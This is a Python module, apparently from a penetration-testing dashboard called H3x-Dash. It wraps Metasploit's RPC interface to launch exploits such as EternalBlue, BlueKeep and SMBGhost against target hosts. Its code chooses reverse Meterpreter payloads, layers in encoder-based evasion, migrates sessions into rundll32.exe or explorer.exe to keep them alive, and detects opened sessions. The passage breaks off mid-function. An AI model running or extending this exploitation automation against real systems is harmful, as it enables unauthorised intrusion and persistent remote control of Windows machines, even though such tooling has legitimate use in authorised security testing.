"""
H3x-Dash MsfEngine
Thread-safe wrapper around pymetasploit3's MsfRpcClient.
Includes socket pre-check, SSL auto-detection, and background
reconnect loop so H3x-Dash keeps trying until msfrpcd is up.

Start msfrpcd (no SSL) before launching H3x-Dash:
    msfrpcd -P msfrpc -S -f
"""
import socket
import threading
import time


# How long to wait for a TCP connection to msfrpcd (seconds)
_CONNECT_TIMEOUT = 5

# Seconds between auto-reconnect attempts
_RETRY_INTERVAL  = 10


# ── Fragile exploits that benefit from stager-level migration ─────────────────
# Kernel-injection exploits (EternalBlue family, BlueKeep) land their payload in
# an unstable host process that frequently dies seconds after — and often DURING
# meterpreter staging, before any post-session migration can fire. The robust
# fix is PrependMigrate: a payload-stager option that migrates into a fresh,
# stable process BEFORE meterpreter loads. The stager spawns its target process,
# moves into it, and only then pulls down meterpreter — so the unstable host
# process is abandoned before meterpreter ever lives there. This is the standard
# operator mitigation for the "session opened then died" pattern.
_FRAGILE_EXPLOIT_MARKERS = (
    'ms17_010_eternalblue',
    'eternalblue',
    'ms17_010',          # covers eternalblue variants; psexec lands in a clean
                         # service but the prepend is harmless there
    'cve_2019_0708',     # BlueKeep — RDP kernel UAF, very unstable session
    'bluekeep',
    'cve_2020_0796',     # SMBGhost — SMBv3 kernel
    'smbghost',
)
# Stable migration targets for session hardening.
_PREPEND_MIGRATE_PROC = 'rundll32.exe'
_STAGELESS_MIGRATE_PROC = 'rundll32.exe'
# After repeated session deaths, escalate to a heavier but very stable host.
_STAGELESS_MIGRATE_PROC_ESCALATED = 'explorer.exe'

_CURATED_DEFAULT_PAYLOADS = {
    # Kernel SMB exploits: prefer stageless x64 reverse — the stager for
    # meterpreter/reverse_tcp is the #1 cause of "session opened then died"
    # on EternalBlue. Stageless skips that fragile staging step entirely.
    'exploit/windows/smb/ms17_010_eternalblue':
        'windows/x64/meterpreter_reverse_tcp',
    'exploit/windows/smb/cve_2020_0796_smbghost':
        'windows/x64/meterpreter_reverse_tcp',
}

# Adaptive fallback: when a fragile exploit opens a session that immediately
# dies on first interaction, the next blank-payload run for that same
# module+target should prefer a stageless payload.
_ADAPTIVE_STAGELESS_PAYLOADS = {
    'exploit/windows/smb/ms17_010_eternalblue':
        'windows/x64/meterpreter_reverse_tcp',
    'exploit/windows/smb/cve_2020_0796_smbghost':
        'windows/x64/meterpreter_reverse_tcp',
}


def _is_fragile_exploit(module: str) -> bool:
    m = (module or '').lower()
    return any(marker in m for marker in _FRAGILE_EXPLOIT_MARKERS)


def _curated_default_payload(module: str) -> str | None:
    """Return a known-compatible payload for modules where blank is risky."""
    m = (module or '').lower()
    for needle, payload in _CURATED_DEFAULT_PAYLOADS.items():
        if needle in m:
            return payload
    return None


def _is_stageless_payload(payload: str) -> bool:
    """
    True for single-file payloads like windows/x64/meterpreter_reverse_tcp.
    PrependMigrate is a *stager* option and has no effect on these — they
    need InitialAutoRunScript instead.
    """
    pl = (payload or '').lower()
    if not pl.startswith('windows/'):
        return False
    return '/meterpreter/' not in pl and 'meterpreter_' in pl


def _stageless_migrate_proc(module: str, rhosts, death_count: int = 0) -> str:
    """Pick migration host; escalate after repeated session deaths."""
    if death_count >= 2:
        return _STAGELESS_MIGRATE_PROC_ESCALATED
    return _STAGELESS_MIGRATE_PROC


def _first_rhost(rhosts) -> str:
    """Normalize RHOSTS to the first host token for per-target adaptation."""
    return str(rhosts or '').split(',')[0].strip().lower()


def _port_open(host: str, port: int, timeout: float = _CONNECT_TIMEOUT) -> bool:
    """Quick TCP reachability check — avoids hanging the whole app."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


class MsfEngine:

    def __init__(self):
        self._client    = None
        self._connected = False
        self._version   = None
        self._lock         = threading.Lock()
        self._exploit_lock = threading.Lock()   # prevents concurrent exploit launches
        self._retry_thr = None        # background reconnect thread
        self._stop_retry = threading.Event()
        self._last_error = None       # last connection error string
        # session_id -> {module, rhost} for newly-opened sessions
        self._session_origin: dict[str, dict] = {}
        # (module, rhost) -> dead-session count
        self._dead_session_counts: dict[tuple[str, str], int] = {}
        self._session_state_lock = threading.Lock()

    # ── Connection ────────────────────────────────────────────────────────────

    def connect(self, host='127.0.0.1', port=55553, password='msfrpc', ssl=False) -> dict:
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except ImportError:
            return {
                'status':  'error',
                'message': (
                    'pymetasploit3 not installed. Install on Kali: '
                    'sudo apt-get install python3-pymetasploit3  '
                    '(or pip install pymetasploit3 --break-system-packages '
                    'if the apt package is unavailable in your Kali version)'
                ),
            }

        # ── 1. TCP reachability check ─────────────────────────────────────────
        if not _port_open(host, port):
            msg = (
                f'Cannot reach {host}:{port} — '
                'is msfrpcd running?  Start it with: '
                'msfrpcd -P msfrpc -S -f'
            )
            with self._lock:
                self._connected = False
                self._last_error = msg
            return {'status': 'error', 'message': msg}

        # ── 2. Try to authenticate ────────────────────────────────────────────
        #    pymetasploit3 uses requests under the hood; when msfrpcd was started
        #    with -S (no SSL) we must pass ssl=False explicitly AND the library
        #    must not override it.  We try no-SSL first, then SSL as a fallback.
        attempts = [(False, 'no-SSL'), (True, 'SSL')]
        if ssl:
            attempts = [(True, 'SSL'), (False, 'no-SSL')]

        last_exc = None
        for use_ssl, label in attempts:
            try:
                client  = MsfRpcClient(
                    password,
                    server = host,
                    port   = port,
                    ssl    = use_ssl,
                )
                version = client.core.version      # ping — raises if auth fails
                with self._lock:
                    self._client    = client
                    self._version   = version
                    self._connected = True
                    self._last_error = None
                print(f'[H3x-Dash] MSF RPC connected ({label}) — {version}')
                return {'status': 'connected', 'version': version}
            except Exception as exc:
                last_exc = exc
                continue

        msg = f'Auth failed ({host}:{port}): {last_exc}'
        with self._lock:
            self._connected  = False
            self._client     = None
            self._last_error = msg
        return {'status': 'error', 'message': msg}

    def _client_ref(self):
        """
        Snapshot self._client under the lock and return it.
        Callers use the returned reference for RPC calls — safe because even
        if disconnect() sets self._client = None on another thread, the
        snapshot still holds the original object reference.
        Returns None if not connected.
        """
        with self._lock:
            return self._client if self._connected else None

    def _adaptive_payload_for(self, module: str, rhosts) -> tuple[str | None, int]:
        """Return (payload, death_count) for adaptive stageless fallback."""
        module_key = (module or '').lower()
        candidate = _ADAPTIVE_STAGELESS_PAYLOADS.get(module_key)
        if not candidate:
            return None, 0
        key = (module_key, _first_rhost(rhosts))
        with self._session_state_lock:
            deaths = self._dead_session_counts.get(key, 0)
        if deaths > 0:
            return candidate, deaths
        return None, 0

    def _remember_session_origin(self, sessions: list, module: str, rhosts) -> None:
        """Link newly-opened session IDs back to module+target context."""
        module_key = (module or '').lower()
        rhost_key = _first_rhost(rhosts)
        if not module_key or not rhost_key:
            return
        with self._session_state_lock:
            for s in sessions or []:
                sid = str(s.get('id', '')).strip()
                if sid:
                    self._session_origin[sid] = {
                        'module': module_key,
                        'rhost': rhost_key,
                    }

    def _note_dead_session(self, session_id: str) -> tuple[str | None, str | None, int]:
        """
        Mark one dead session for its originating module+target.
        Returns (module, rhost, count) or (None, None, 0) if unknown.
        """
        sid = str(session_id).strip()
        if not sid:
            return None, None, 0
        with self._session_state_lock:
            origin = self._session_origin.pop(sid, None)
            if not origin:
                return None, None, 0
            key = (origin.get('module', ''), origin.get('rhost', ''))
            self._dead_session_counts[key] = self._dead_session_counts.get(key, 0) + 1
            count = self._dead_session_counts[key]
        return key[0], key[1], count

    def disconnect(self):
        self._stop_retry.set()          # kill retry thread if running
        with self._lock:
            self._client    = None
            self._connected = False
            self._version   = None

    def is_connected(self) -> bool:
        return self._connected and self._client is not None

    def get_version(self) -> str | None:
        return self._version

    def get_last_error(self) -> str | None:
        return self._last_error

    def get_session_count(self) -> int:
        return len(self.list_sessions())

    # ── Auto-reconnect ────────────────────────────────────────────────────────

    def start_auto_connect(self, host='127.0.0.1', port=55553,
                           password='msfrpc', ssl=False):
        """
        Spawn a background thread that keeps trying to connect until it
        succeeds.  Safe to call multiple times — only one thread runs.
        """
        if self._retry_thr and self._retry_thr.is_alive():
            return  # already running

        self._stop_retry.clear()
        self._retry_thr = threading.Thread(
            target   = self._reconnect_loop,
            args     = (host, port, password, ssl),
            daemon   = True,
            name     = 'h3x-msf-autoconnect',
        )
        self._retry_thr.start()

    def _reconnect_loop(self, host, port, password, ssl):
        attempt = 0
        while not self._stop_retry.is_set():
            if self.is_connected():
                # Already up — just health-check every _RETRY_INTERVAL seconds
                try:
                    _c = self._client_ref()
                    if _c is None:
                        raise RuntimeError('client is None')
                    _ = _c.core.version
                except Exception:
                    with self._lock:
                        self._connected = False
                        self._client    = None
                    print('[H3x-Dash] MSF RPC connection lost — retrying...')
                self._stop_retry.wait(_RETRY_INTERVAL)
                continue

            attempt += 1
            print(f'[H3x-Dash] MSF RPC connect attempt {attempt} '
                  f'({host}:{port}) ...')
            result = self.connect(host=host, port=port,
                                  password=password, ssl=ssl)
            if result['status'] == 'connected':
                print(f'[H3x-Dash] MSF RPC online — {result.get("version","")}')
                # Stay in loop to health-check, but slow down
                self._stop_retry.wait(_RETRY_INTERVAL)
            else:
                print(f'[H3x-Dash] MSF RPC unavailable — '
                      f'{result.get("message","")}  '
                      f'(retry in {_RETRY_INTERVAL}s)')
                self._stop_retry.wait(_RETRY_INTERVAL)

    # ── Module search ─────────────────────────────────────────────────────────

    def search(self, query: str) -> list:
        client = self._client_ref()
        if client is None:
            return []
        try:
            raw = client.modules.search(query)
            return [
                {
                    'fullname':    m.get('fullname', ''),
                    'type':        m.get('type', ''),
                    'rank':        m.get('rank', ''),
                    'description': m.get('description', ''),
                }
                for m in (raw or [])[:50]
            ]
        except Exception as e:
            return [{'error': str(e)}]

    # ── Exploit execution ─────────────────────────────────────────────────────

    def run_exploit(self, module: str, options: dict, payload: str = None,
                    target: int = None, action: str = 'run',
                    poll_timeout: int = 60, auto_migrate=None) -> dict:
        """
        Dispatch an exploit/auxiliary/post module via msfrpcd.

        Args:
            module:       full module path (e.g. exploit/windows/smb/ms17_010_eternalblue)
            options:      dict of options (RHOSTS, RPORT, LHOST, LPORT, etc.)
            payload:      payload module path, or None for module default
            target:       target index (None = module default, usually 0)
            action:       'run' to exploit, 'check' to test vuln without exploiting
            poll_timeout: max seconds to wait for console to go idle (default 60)
            auto_migrate: harden fragile exploits by migrating the session out of
                          its host process the instant it opens. None = auto
                          (on for kernel-injection exploits like eternalblue,
                          off otherwise). True/False to force.

        Returns a dict with status, result (the wrapper log), console_output
        (raw MSF output), sessions (new sessions opened), and outcome flags
        (exploit_failed, check_vulnerable, check_safe).
        """
        client = self._client_ref()
        if client is None:
            return {'status': 'error', 'message': 'Not connected to Metasploit RPC'}
        if not module:
            return {'status': 'error', 'message': 'No module specified'}

        # Prevent concurrent exploit launches on the same RPC connection.
        if not self._exploit_lock.acquire(blocking=False):
            return {'status': 'error',
                    'message': 'An exploit is already running — wait for it to complete'}
        try:
            return self._run_exploit_inner(client, module, options or {},
                                            payload, target, action, poll_timeout,
                                            auto_migrate)
        finally:
            self._exploit_lock.release()

    def _run_exploit_inner(self, client, module: str, options: dict,
                           payload: str = None, target: int = None,
                           action: str = 'run', poll_timeout: int = 60,
                           auto_migrate=None) -> dict:
        """
        Run a module via the msfrpcd consoles API.

        Why console-based: client.modules.use() + module.execute() dispatches
        the exploit but DOESN'T capture the runtime output ("Selected Target",
        "Sending stage", "Exploit failed: ..."). The consoles API runs commands
        through a real msf6 console where every line is visible. That's the
        difference between debuggable and undebuggable.

        Also fixes the LHOST/LPORT drop bug: setting them on the console
        datastore makes them available to the module's *default* payload —
        no need to choose an explicit payload just to set a callback address.
        """
        log = []
        L = lambda line='': log.append(line)

        # ── Layer evasion options into the datastore ──────────────────────
        # If the operator has selected a stealth level on the dashboard,
        # MSF encoder + stage-encoding options get injected here. Operator-
        # supplied options take precedence (their explicit ENCODER overrides
        # the evasion-profile default), so this is non-intrusive.
        try:
            from modules import evasion as _evasion
            evasion_opts = _evasion.msf_options_for()
            # Only inject for exploits; aux/post modules don't take encoders
            is_exploit = (module or '').startswith('exploit/')
            if evasion_opts and is_exploit:
                merged = dict(evasion_opts)
                merged.update(options or {})       # operator wins on conflict
                options = merged
                profile = _evasion.level_profile()
                if profile['level'] > 0:
                    L(f'STEALTH  : {profile["name"]} (level {profile["level"]}) '
                      f'— {evasion_opts.get("ENCODER", "no encoder")} '
                      f'× {evasion_opts.get("EncoderItr", 0)} iterations')
        except Exception as _ex:
            pass    # never let evasion config break exploit dispatch

        # ── Parse module type ─────────────────────────────────────────────
        _VALID_TYPES = ('exploit', 'auxiliary', 'post', 'payload', 'evasion')
        _mod_parts   = module.split('/')
        _mod_type    = _mod_parts[0] if _mod_parts and _mod_parts[0] in _VALID_TYPES else 'exploit'
        _mod_name    = '/'.join(_mod_parts[1:]) if len(_mod_parts) > 1 else module

        # ── Curated payload default for fragile reverse-session exploits ──
        # If the UI/operator leaves PAYLOAD blank, MSF may still choose a
        # reverse payload internally. That used to bypass our LHOST validation
        # and PrependMigrate hardening because h3x-dash could not see the
        # implicit payload name. For x64-native kernel SMB exploits, make the
        # payload explicit before validation and hardening.
        _verb = action if action in ('check', 'run', 'exploit') else 'run'
        if not payload and _verb in ('run', 'exploit') and _mod_type == 'exploit':
            adaptive_payload, deaths = self._adaptive_payload_for(
                module, options.get('RHOSTS', '')
            )
            if adaptive_payload:
                payload = adaptive_payload
                L(f'[*] Payload auto-selected (adaptive): {payload}')
                L(f'    (prior session-died events detected for this target: '
                  f'{deaths}; preferring stageless)')
            else:
                curated_payload = _curated_default_payload(module)
                if curated_payload:
                    payload = curated_payload
                    L(f'[*] Payload auto-selected: {payload}')
                    L('    (curated default for this module; needed for '
                      'LHOST validation and session hardening)')

        # ── Auto-correct known wrong RPORTs ───────────────────────────────
        # Some modules MUST use a specific port regardless of which port
        # triggered the suggestion. ms17_010_* exploits SMBv1 on 445 — if the
        # UI pre-filled 139 (NetBIOS, the other SMB-ish port) the exploit will
        # connect but the SMBv1 negotiation fails and you get a confusing
        # "exploit completed but no session". Force the correct port and tell
        # the operator we did.
        FORCE_RPORT = {
            'ms17_010_eternalblue': '445',
            'ms17_010_psexec':      '445',
            'ms17_010':             '445',
            'cve_2020_0796':        '445',   # SMBGhost
        }
        for needle, correct in FORCE_RPORT.items():
            if needle in (module or '') and str(options.get('RPORT', '')) not in ('', correct):
                wrong = options.get('RPORT')
                options = dict(options)
                options['RPORT'] = correct
                L(f'[!] RPORT auto-corrected {wrong} → {correct} '
                  f'({needle} requires SMB on {correct}, not {wrong})')
                break

        # ── Pre-flight banner ─────────────────────────────────────────────
        L(f'MODULE   : {module}')
        L(f'ACTION   : {action}')
        L(f'TARGET   : {options.get("RHOSTS","?")} : {options.get("RPORT","?")}')
        if target is not None:
            L(f'TGT IDX  : {target}')
        L(f'PAYLOAD  : {payload or "(module default)"}')
        lhost = options.get('LHOST', '')
        lport = options.get('LPORT', '')
        if lhost:
            L(f'HANDLER  : {lhost} : {lport or "4444 (default — set automatically)"}')
        else:
            L(f'HANDLER  : (no LHOST set — reverse payloads will FAIL)')
        extra = {k: v for k, v in (options or {}).items()
                 if k not in ('RHOSTS', 'RPORT', 'LHOST', 'LPORT')}
        if extra:
            L(f'OPTIONS  : {extra}')
        L()

        # ── Validate module via module RPC (lightweight — doesn't execute) ─
        # If pymetasploit3 chokes loading metadata, we DON'T bail — the
        # console-based execution that follows works without test_mod. Skip
        # pre-flight, log the limitation, continue.
        #
        # But IF .use() returns None/unusable (no exception), that means the
        # module truly doesn't exist — bail with a clear error.
        L(f'[*] Validating module... ({_mod_type})')
        test_mod = None
        load_failed_gracefully = False     # exception we degraded past
        try:
            test_mod = client.modules.use(_mod_type, _mod_name)
        except (TypeError, KeyError) as exc:
            if 'subscriptable' in str(exc) or 'iterable' in str(exc):
                # pymetasploit3 trips on malformed module.compatible_payloads
                # responses for some exploit modules. Known library quirk,
                # not an msfrpcd bad state. Auxiliary modules don't hit this
                # because they skip the compatible_payloads RPC call.
                L(f'[!] pymetasploit3 cannot parse {module} metadata — '
                  f'skipping pre-flight')
                L(f'    (library threw: {type(exc).__name__}: {exc})')
                L(f'    Known compatibility quirk between pymetasploit3 and')
                L(f'    some MSF versions when enumerating compatible payloads.')
                L(f'    Module will still fire via console — missing options')
                L(f'    will surface in MSF output instead of pre-flight.')
                L(f'')
                load_failed_gracefully = True
                test_mod = None
                # Fall through to console execution
            else:
                L(f'[ERROR] Module load raised: {type(exc).__name__}: {exc}')
                return {'status': 'error',
                        'message': f'Module load failed: {exc}',
                        'result':  '\n'.join(log)}
        except Exception as exc:
            L(f'[ERROR] Module load raised: {exc}')
            return {'status': 'error',
                    'message': f'Module load failed: {exc}',
                    'result':  '\n'.join(log)}

        # Module truly not found: .use() returned no usable object AND no
        # graceful-degradation exception fired. Bail with the same diagnostic
        # message we've always shown for missing modules.
        if not load_failed_gracefully and (
            not test_mod or not hasattr(test_mod, 'options')):
            L(f'[ERROR] Module not loaded: {module}')
            L(f'  msfrpcd did not return a usable module for')
            L(f'    type:  {_mod_type}')
            L(f'    path:  {_mod_name}')
            L(f'  Verify it exists:  msfconsole -q -x "use {module}; exit"')
            L(f'  Or:                grep -r "{_mod_name}" /usr/share/metasploit-framework/modules/')
            return {'status': 'error',
                    'message': f'Module not found: {module}',
                    'result':  '\n'.join(log)}

        # Inspect metadata only when we have a working test_mod
        if test_mod is not None:
            try:
                L(f'[*] Rank      : {test_mod.rank}')
                tgt_list = list(getattr(test_mod, 'targets', []) or [])
                L(f'[*] Targets   : {len(tgt_list)}')
                if tgt_list:
                    show_count = min(6, len(tgt_list))
                    for i in range(show_count):
                        marker = '←' if i == (target if target is not None else 0) else ' '
                        L(f'    [{i}]{marker} {tgt_list[i]}')
                    if len(tgt_list) > show_count:
                        L(f'    ... +{len(tgt_list) - show_count} more')
                        L(f'    (override default with the TARGET field if your OS')
                        L(f'     doesn\'t match target 0 — wrong target is the #1')
                        L(f'     cause of "exploit ran but no session")')
            except Exception:
                pass

        # ── Validate ONLY the critical no-default options before firing ───
        # History lesson: pymetasploit3's option metadata is unreliable as a
        # blocker. It has now produced false-positive "missing required" spam
        # three times — smb_login (39 framework options), then psexec
        # (CheckModule, which HAS a default of auxiliary/scanner/smb/smb_ms17_010
        # that pymetasploit3's runopts simply didn't surface).
        #
        # The lesson: MSF itself applies module defaults at run time. We should
        # NOT try to second-guess which options have defaults — MSF knows. We
        # only block on the tiny set of options that genuinely never have a
        # default AND that MSF cannot infer:
        #     RHOSTS / RHOST — the target. No module ships a default target.
        #     LHOST          — callback address for reverse payloads.
        # Everything else (CheckModule, SMB::*, NTLM::*, THREADS, ...) is left
        # to MSF, which fills defaults automatically when the module runs.
        CRITICAL_NO_DEFAULT = {'RHOSTS', 'RHOST'}
        provided_upper = {k.upper() for k, v in options.items()
                          if v not in (None, '')}

        missing_critical = []
        # Target is always required (unless this is a purely local/post module).
        if _mod_type not in ('post',):
            if not (provided_upper & CRITICAL_NO_DEFAULT):
                missing_critical.append('RHOSTS')

        # LHOST is required for reverse payloads — without it the callback has
        # nowhere to go. Detect reverse payloads by name.
        is_reverse = bool(payload and 'reverse' in payload.lower())
        if is_reverse and 'LHOST' not in provided_upper:
            missing_critical.append('LHOST')

        if missing_critical:
            L()
            L(f'[ERROR] Missing required option(s): {", ".join(missing_critical)}')
            for opt in missing_critical:
                hint = ('the target host — e.g. 192.168.1.43'
                        if opt == 'RHOSTS'
                        else 'your listener IP for the reverse callback')
                L(f'    {opt:<10} {hint}')
            L(f'  Set these in the options panel and re-launch.')
            return {'status': 'error',
                    'message': f'Missing required: {", ".join(missing_critical)}',
                    'result':  '\n'.join(log),
                    'missing_required': missing_critical}

        # ── Aux / post — strip payload + payload-only options ─────────────
        if _mod_type in ('auxiliary', 'post'):
            if payload:
                L(f'[!] {_mod_type} module — payload "{payload}" ignored')
                L(f'    Auxiliary and post modules do not deliver payloads;')
                L(f'    no session will result. Module writes findings to the')
                L(f'    MSF job console only.')
                payload = None
            for k in list(options.keys()):
                if k in ('LHOST', 'LPORT', 'EXITFUNC', 'EXITONSESSION'):
                    options.pop(k)

        # ── LPORT auto-default when LHOST set ─────────────────────────────
        # MSF will refuse to start a reverse handler without LPORT. Operator
        # often sets LHOST and forgets — silently default to 4444.
        if options.get('LHOST') and not options.get('LPORT'):
            options['LPORT'] = '4444'
            L('[*] LPORT auto-defaulted to 4444 (LHOST set, LPORT empty)')

        # ── Session baseline ──────────────────────────────────────────────
        try:
            sessions_before = {str(s.get('id', '')) for s in self.list_sessions()}
        except Exception:
            sessions_before = set()
        L(f'[*] Sessions before launch: {len(sessions_before)}')

        # ── Pre-flight: confirm target is actually reachable ──────────────
        # This catches the #2 cause of "exploit ran, no session" — the
        # operator firing against an unreachable IP (firewall, target down,
        # wrong RPORT). Cheap (~1s) and saves minutes of waiting on a
        # doomed exploit.
        rhosts_raw = options.get('RHOSTS', '')
        rport_raw  = options.get('RPORT', '')
        if rhosts_raw and rport_raw and _mod_type == 'exploit':
            # RHOSTS may be a comma-separated list — only test the first
            test_host = str(rhosts_raw).split(',')[0].strip()
            try:
                test_port = int(rport_raw)
                with socket.create_connection((test_host, test_port), timeout=3):
                    L(f'[*] Pre-flight: {test_host}:{test_port} TCP reachable')
            except (socket.timeout, socket.gaierror, ConnectionRefusedError, OSError) as exc:
                L(f'[!] Pre-flight: {test_host}:{test_port} NOT reachable ({exc})')
                L(f'    Continuing anyway — some exploits target ports that')
                L(f'    close immediately after probe. But if the target is')
                L(f'    down or behind a firewall, the exploit will time out.')
            except (TypeError, ValueError):
                L(f'[!] Pre-flight: RPORT {rport_raw!r} not parseable as int')
        L()

        # ── Create msfrpcd console for execution ──────────────────────────
        L('[*] Opening MSF console for execution...')
        try:
            console = client.consoles.console()
            cid     = console.cid
        except Exception as exc:
            L(f'[ERROR] Console creation failed: {exc}')
            return {'status': 'error',
                    'message': f'Console creation failed: {exc}',
                    'result':  '\n'.join(log)}

        L(f'[*] Console ready: cid={cid}')

        try:
            # Drain startup banner
            time.sleep(0.4)
            try:
                _ = console.read()
            except Exception:
                pass

            # Build command sequence
            commands = [f'use {module}']
            if payload:
                commands.append(f'set PAYLOAD {payload}')
            for k, v in options.items():
                if v in (None, ''):
                    continue
                commands.append(f'set {k} {v}')
            if target is not None:
                commands.append(f'set TARGET {target}')

            # ── Session-survival hardening for fragile exploits ───────────────
            # None = auto (on for fragile kernel exploits). Staged payloads use
            # PrependMigrate (stager-level). Stageless payloads MUST use
            # InitialAutoRunScript — PrependMigrate has no effect on them.
            do_migrate = auto_migrate
            if do_migrate is None:
                do_migrate = _is_fragile_exploit(module)
            _payload_is_windows = bool(payload and payload.lower().startswith('windows/'))
            _, death_count = self._adaptive_payload_for(
                module, options.get('RHOSTS', ''))
            if (do_migrate and _verb in ('run', 'exploit')
                    and _mod_type == 'exploit' and _payload_is_windows):
                if _is_stageless_payload(payload):
                    mig_proc = _stageless_migrate_proc(
                        module, options.get('RHOSTS', ''), death_count)
                    commands.append(
                        f'set InitialAutoRunScript migrate -n {mig_proc}')
                    L(f'[*] Session hardening: InitialAutoRunScript migrate '
                      f'→ {mig_proc}')
                    L('    (stageless payload — runs migrate immediately when '
                      'the session opens; PrependMigrate does not apply)')
                    if death_count >= 2:
                        L(f'    (escalated after {death_count} prior session '
                          f'deaths on this target)')
                else:
                    commands.append('set PrependMigrate true')
                    commands.append(
                        f'set PrependMigrateProc {_PREPEND_MIGRATE_PROC}')
                    L(f'[*] Session hardening: PrependMigrate → '
                      f'{_PREPEND_MIGRATE_PROC}')
                    L(f'    (stager migrates into {_PREPEND_MIGRATE_PROC} before '
                      f'meterpreter loads)')
            if (_is_fragile_exploit(module) and _verb in ('run', 'exploit')
                    and _mod_type == 'exploit' and _payload_is_windows):
                commands.append('set EXITFUNC thread')
                L('[*] EXITFUNC thread (reduces host-process teardown on fragile '
                  'kernel exploits)')

            # Operator-selected verb: 'run' (exploit), 'check' (vuln test), or 'exploit'
            verb = _verb
            commands.append(verb)

            # Send all commands
            for cmd in commands:
                try:
                    console.write(cmd + '\n')
                except Exception as exc:
                    L(f'[ERROR] console.write({cmd!r}) failed: {exc}')
                    raise
                # echo the command for clarity in the operator log
                # mask password-like values
                masked = cmd
                for sensitive in ('PASSWORD', 'PASS', 'SMBPass', 'BindPass'):
                    if sensitive in cmd:
                        prefix, _, _ = cmd.rpartition(' ')
                        masked = f'{prefix} ********'
                        break
                L(f'    msf6> {masked}')

            L()
            L('[*] Console output:')
            L('─' * 60)

            # Poll console for output until idle or timeout
            console_lines: list[str] = []
            start          = time.time()
            last_data_time = start
            # 8s of silence before declaring done — modern exploits routinely
            # have 5–10s pauses while staging, especially over slow links.
            # Old 3s threshold was exiting the poll loop before the session
            # was actually opened, returning "no session" on successful runs.
            IDLE_THRESHOLD = 8.0
            MIN_WAIT       = 3.0   # never exit before this even if 'idle'
            saw_any_data   = False

            # Compile prompt regex once — strips lines like 'msf6 (mod) >'
            # which are echoes of our own commands plus the empty prompt.
            import re as _re
            _PROMPT_RX = _re.compile(r'^msf\d*\s*(\([^)]*\))?\s*>\s*')

            while time.time() - start < poll_timeout:
                try:
                    resp = console.read()
                except Exception as exc:
                    L(f'[ERROR] console.read() failed: {exc}')
                    break

                data = resp.get('data', '') or ''
                busy = resp.get('busy', False)

                if data:
                    saw_any_data = True
                    for line in data.splitlines():
                        stripped = line.rstrip()
                        if not stripped:
                            continue
                        # Filter msf6 prompt echoes — operator already saw the
                        # commands listed in the wrapper log. Showing them
                        # again here just clutters the output.
                        if _PROMPT_RX.match(stripped):
                            continue
                        L(stripped)
                        console_lines.append(stripped)
                    last_data_time = time.time()

                # Done conditions — both must hold
                elapsed  = time.time() - start
                idle_for = time.time() - last_data_time
                if elapsed >= MIN_WAIT and not busy and idle_for > IDLE_THRESHOLD:
                    break
                # Short-circuit when a session opens — no need to wait longer
                joined = '\n'.join(console_lines).lower()
                if ('session' in joined and 'opened' in joined and idle_for > 1.5):
                    L('')
                    L('[*] Session opened — finalizing.')
                    break

                time.sleep(0.4)
            else:
                L('')
                L(f'[!] Console still busy after {poll_timeout}s — exploit may')
                L(f'    still be running. Check  msfconsole -q -x "jobs -l"')

            # Final drain — catch any trailing lines
            try:
                tail = console.read()
                if tail.get('data'):
                    for line in tail['data'].splitlines():
                        stripped = line.rstrip()
                        if stripped:
                            L(stripped)
                            console_lines.append(stripped)
            except Exception:
                pass

            L('─' * 60)
            full_output = '\n'.join(console_lines)

            # ── Outcome detection from console output ─────────────────────
            text         = full_output.lower()
            # Positive session detection from console text. Guard against the
            # negative phrasings MSF uses on failure ("no session was created",
            # "session ... not opened") so we don't false-positive.
            sess_opened = (
                'opened' in text
                and 'session' in text
                and 'no session' not in text
                and 'not opened' not in text
            )
            check_vuln   = ('vulnerable' in text and
                            ('appears to be vulnerable' in text or
                             '[+]' in full_output and 'vulnerable' in text))
            check_safe   = (('not vulnerable' in text or 'is safe' in text) and
                            '[-]' in full_output)
            exploit_failed = ('exploit failed' in text or
                              'exploit aborted' in text or
                              'exploit completed, but no session was created' in text or
                              'unable to deliver payload' in text)

            # Session diff — the authoritative signal
            try:
                sessions_after = {str(s.get('id', '')): s for s in self.list_sessions()}
            except Exception:
                sessions_after = {}
            new_sessions = [v for k, v in sessions_after.items()
                            if k not in sessions_before]

            # RPC-lag retry: if the console said a session opened but the diff
            # is empty, msfrpcd likely hasn't registered it in sessions.list
            # yet. Retry once after a short sleep so we can populate full
            # session details (and the operator gets the INTERACT button
            # immediately instead of waiting on the frontend poll).
            if sess_opened and not new_sessions:
                time.sleep(1.5)
                try:
                    sessions_after = {str(s.get('id', '')): s
                                      for s in self.list_sessions()}
                    new_sessions = [v for k, v in sessions_after.items()
                                    if k not in sessions_before]
                except Exception:
                    pass
            if new_sessions:
                self._remember_session_origin(
                    new_sessions,
                    module=module,
                    rhosts=options.get('RHOSTS', ''),
                )

            # ── Operator-facing summary ───────────────────────────────────
            L()
            if new_sessions:
                L(f'[+] {len(new_sessions)} new session(s) opened:')
                for s in new_sessions:
                    peer = s.get('target') or s.get('tunnel') or s.get('tunnel_peer') or '?'
                    user = s.get('user') or s.get('username') or '?'
                    L(f'    [{s.get("id")}] {s.get("type", "?")} '
                      f'-> {peer} '
                      f'as {user}')
            elif sess_opened:
                # Output said "session opened" but list_sessions doesn't show it —
                # rare RPC sync issue. Tell operator to recheck.
                L('[+] Console reports session opened — recheck Loot tab in 5s')
            elif check_vuln:
                L('[+] Target appears VULNERABLE (check mode — no exploit fired)')
            elif check_safe:
                L('[-] Target reports NOT VULNERABLE')
            elif exploit_failed:
                L('[!] Exploit failed — diagnostics below:')
                L('    Common causes (in order of likelihood):')
                L('     1. Wrong target index — set TARGET 0/1/2/... explicitly')
                L('     2. LHOST not routable from RHOSTS (firewall / NAT)')
                L('     3. RHOSTS unreachable on RPORT (run nmap -p {} {})'.format(
                    options.get('RPORT','?'), options.get('RHOSTS','?')))
                L('     4. Missing module-specific option (SMBPipe, TARGETURI, etc.)')
                L('     5. Module rank too low — target may be patched')
            elif not saw_any_data:
                L('[!] No console output captured.')
                L('    msfrpcd may not have processed the commands. Verify:')
                L(f'      msfconsole -q -x "use {module}; show options; exit"')
            else:
                # Got output but nothing conclusive — could be aux scanner
                if _mod_type in ('auxiliary', 'post'):
                    L(f'[*] {_mod_type.capitalize()} module completed — '
                      f'no session expected.')
                    L(f'    Findings (if any) are in the output above.')
                else:
                    L('[?] No session opened and no explicit failure reported.')
                    L('    Module may have completed without an exploit attempt')
                    L('    (e.g. silent target-incompatibility check).')

            return {
                'status':           'launched',
                'result':           '\n'.join(log),
                'console_output':   full_output,
                'sessions':         new_sessions,
                'session_opened':   bool(new_sessions or sess_opened),
